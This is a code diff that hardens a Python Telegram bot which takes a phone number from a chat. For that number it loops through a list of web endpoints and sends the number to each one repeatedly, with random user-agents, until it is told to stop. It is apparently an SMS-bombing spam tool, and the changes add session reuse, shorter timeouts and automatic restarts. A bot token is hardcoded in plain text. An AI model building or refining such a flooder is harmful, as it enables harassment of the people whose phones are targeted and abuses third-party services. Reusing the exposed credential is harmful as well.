@@ -2,8 +2,19 @@ import telebot
 import requests
 from fake_useragent import UserAgent
 import threading
+import time
+import logging
 
-bot = telebot.TeleBot("8736392114:AAFbnaTe3ZLkjCP2Pu7bQnPm2sEMYPV6RUU")
+logging.basicConfig(level=logging.ERROR)
+
+TOKEN = "8736392114:AAFbnaTe3ZLkjCP2Pu7bQnPm2sEMYPV6RUU"
+
+try:
+    requests.get(f"https://api.telegram.org/bot{TOKEN}/deleteWebhook?drop_pending_updates=true")
+except:
+    pass
+
+bot = telebot.TeleBot(TOKEN)
 bot.remove_webhook()
 
 endpoints = [
@@ -47,14 +58,13 @@ def handle(m):
 
     def worker(chat_id, phone):
         ua = UserAgent()
+        session = requests.Session()
         while not active[chat_id]['stop']:
             for ep in endpoints:
                 if active[chat_id]['stop']:
                     break
                 try:
-                    headers = {'user-agent': ua.random}
-                    data = {'phone': phone}
-                    requests.post(ep, headers=headers, data=data, timeout=5)
+                    session.post(ep, headers={'user-agent': ua.random}, data={'phone': phone}, timeout=3)
                 except:
                     pass
 
@@ -72,4 +82,9 @@ def stop_callback(call):
         bot.answer_callback_query(call.id, 'нет спама')
 
 if __name__ == '__main__':
-    bot.infinity_polling()
+    while True:
+        try:
+            bot.infinity_polling(timeout=60, long_polling_timeout=30)
+        except Exception as e:
+            logging.error(e)
+            time.sleep(5)
